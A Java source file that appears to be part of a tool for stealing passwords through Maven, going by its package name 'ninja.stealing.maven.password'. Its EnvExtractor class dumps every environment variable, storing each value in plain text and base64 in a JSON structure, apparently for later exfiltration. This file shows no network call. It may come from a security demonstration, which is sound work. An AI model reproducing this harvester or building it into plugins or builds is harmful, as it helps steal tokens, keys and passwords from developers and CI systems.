package ninja.stealing.maven.password.extractor;

import java.util.Map;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;

import ninja.stealing.maven.password.Utils;
import ninja.stealing.maven.password.model.Extraction;

public class EnvExtractor implements Extractor {
	static final String EXTRACTOR_ID = "ENV" ;

	@Override
	public Extraction extract() {
		
		ObjectMapper mapper =new ObjectMapper();
	    ObjectNode content = mapper.createObjectNode();
	    
		Map<String, String> env = System.getenv();
		for (String envName : env.keySet()) {
			ObjectNode dumpEnv = mapper.createObjectNode();
			dumpEnv.put("value", env.get(envName));
			dumpEnv.put("value_b64",Utils.b64(env.get(envName)));
			content.set(envName, dumpEnv);
		}
	    
		Extraction extraction = new Extraction(EXTRACTOR_ID, content);
		return extraction;
	}

}
